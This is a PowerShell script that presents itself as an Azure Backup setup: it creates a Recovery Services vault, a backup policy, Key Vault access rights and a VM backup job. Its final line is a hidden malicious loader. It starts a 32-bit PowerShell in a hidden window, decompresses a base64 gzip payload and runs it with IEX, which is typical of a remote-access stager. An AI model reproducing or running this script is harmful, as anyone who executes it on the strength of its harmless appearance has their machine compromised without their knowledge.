
$rsVaultName = "myRsVault"
$rgName = "myResourceGroup"
$location = "East US"


Register-AzResourceProvider -ProviderNamespace "Microsoft.RecoveryServices"
New-AzResourceGroup -Location $location -Name $rgName


New-AzRecoveryServicesVault `
    -Name $rsVaultName `
    -ResourceGroupName $rgName `
    -Location $location 
$vault1 = Get-AzRecoveryServicesVault -Name $rsVaultName
Set-AzRecoveryServicesProperties ` 
    -Vault $vault1 `
    -BackupStorageRedundancy GeoRedundant
    

Get-AzRecoveryServicesVault -Name $rsVaultName | Set-AzRecoveryServicesVaultContext 
$schPol = Get-AzRecoveryServicesSchedulePolicyObject -WorkloadType "AzureVM"
$retPol = Get-AzRecoveryServicesRetentionPolicyObject -WorkloadType "AzureVM"
New-AzRecoveryServicesProtectionPolicy `
    -Name "NewPolicy" `
    -WorkloadType "AzureVM" ` 
    -RetentionPolicy $retPol `
    -SchedulePolicy $schPol
    

Set-AzKeyVaultAccessPolicy `
    -VaultName "KeyVaultName" `
    -ResourceGroupName "KyeVault-RGName" ` 
    -PermissionsToKeys backup,get,list `
    -PermissionsToSecrets backup,get,list ` 
    -ServicePrincipalName 262044b1-e2ce-469f-a196-69ab7ada62d3
$pol = Get-AzRecoveryServicesProtectionPolicy -Name "NewPolicy" `
Enable-AzRecoveryServicesProtection `
    -Policy $pol `
    -Name "myVM" `
    -ResourceGroupName "VM-RGName" 
    

$retPol = Get-AzRecoveryServicesRetentionPolicyObject -WorkloadType "AzureVM"
$retPol.DailySchedule.DurationCountInDays = 365
$pol = Get-AzRecoveryServicesProtectionPolicy -Name "NewPolicy"
Set-AzRecoveryServicesProtectionPolicy `
    -Policy $pol `
    -RetentionPolicy $RetPol
    

$namedContainer = Get-AzRecoveryServicesContainer -ContainerType "AzureVM" -Status "Registered" -FriendlyName "myVM"
$item = Get-AzRecoveryServicesItem -Container $namedContainer -WorkloadType "AzureVM"
$job = Backup-AzRecoveryServicesItem -Item $item
$joblist = Get-AzRecoveryServicesJob -Status "InProgress"
Wait-AzRecoveryServicesJob `
        -Job $joblist[0] `
        -Timeout 43200

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIACSNllcCA71WbW/iOBD+3Er7H6IVUhId5b3ttdJKlwCBtKQLTYECi05u4iQGE1PHocDe/vebQNJStb3b2w8XFdWxZ+xnnnnGEy8OHUFYKM17zapp0aXndQzp+6fjoy7iaCEpOdSL4k3XWflCq+alHJ3dsP5aPToCk9xj3ApqkW9JXyRloi2XDbZAJJxeXtZjznEo9u+FFhZaFOHFAyU4UlTpL2kYYI5Pvj7MsCOk71Luz0KLsgdEU7NNHTkBlk600E3WOsxBCciCvaREKPK3b7I6OSlPC83HGNFIke1NJPCi4FIqq9IPNTnwbrPEimwRh7OIeaIwJGG1UuiHEfLwDey2whYWAXMjWYVI4I9jEfNQeo4p2WRvosgw7HLmaK7LcQQeBTNcsTlWcmFMaV76Q5mkCG7jUJAFhnWBOVvamK+Ig6NCG4UuxbfYmyo3+CkL/GedlEMnsOoKruYhNR9AtZgbU7z3ltW3YF+lVIXnJa3AxY9Px5+OvUwWwmweqgFGR5PdGANWpcsisjP7IpXykgUnIsH4Bl5zdzzG6lSaJHmYTKdSjgTsIvTM8/zHe5QzBzBfDc7OR37jgZVMWJkMGHGn4JkmK+c78eguWfhYdQ3skRA3NiFaECcTlvIe/9ijeBduITO7AXCKnC5gt4Ep9pFI2MxLk7duzQURz756TKiLueZADiNABelVX4PZJ0iRzdDCC+Br/y5DGjyQM86sUwlvstOTdzCS6xRFUV7qxlBPTl6yMaLYzUtaGJF0SYsF2w3lF7hWTAVxUCSy7abqM5HpgXUWRoLHDuQQgr+zl9ghiCZc5KU2cbG+sYmfHSy/y0QdUUpCH3ZaQSZgJmHAFokyOGB8VoFasLEwF0uKF2C3q26DIh9qOa2GnZyQj135DcxM6ntdJ4xkVByAhDTblIm8NCBcwC2RsHugqV+HcnBV7EHVOU6To2TlM9E3IlF9bnsfLy/K94lQU652zHABrBicLXQU4bOaLThwpnwufiV1DZ6RGVLL0eekrD2RsmnBr0+qJmucu9dXs3aRN9aBp5mRabW7jV67XVtd2YOasJumuO6awmrez2a21r7tj8TY1Np3pDQf1bbLK7K1O5o7WhfPtvr2qaSvtzPf9UYNz/PPPfu2fGqQzrDe00sV1Gk0485Qf9JLtahJnto90u/NrwzxMBpQ1PeK/n35ApF1h88GZWZtTU1rBVVne+UNWoHlbkbt4sWwNteamlYPmwNDZ9cjnWvd4qBv6L1+U+/1YO7ML3o1mKO/BUnYGg6D2Si8om71djuun87HrdNtZ3FKXU0fDY3gl35aiyyvG7YGeDo9ff2oD3Sm+VrYqIULFOjDQYWMl/e3AawbEKZVLNVMF6/Z750hGayKA+Trj7oxvkdaZ7wxisXyKKqgOeyhA2Bj/Ahxj5ZGl4L/Xb/CtAG9ebHttRvXzrh8HllfPifaAfHkBK8cyOGju99CPAoQBZnAhZ5VrMG4kV7MXUYSD0V51bfnmIeYQp+DTpgJX6OUOUm7SK5y6FT7/jGF6u3DsFp5d6RKz4bqSwfJpi4vxwAWSiiVd6GDQ18E+dK6WipBIyitayUI9+djrLPlRsl2yye9JKHp4AC6O0BNaiu3DU7b/w+DaWUH8M/9FwZf5v5h9adYLeV3sb+ZfT3xn+j9ZQKGiAjwsOF2onjfNN/lIRXNwbdGkiTQg5c+yTff11ic3MAnyN9CrE0ocwoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

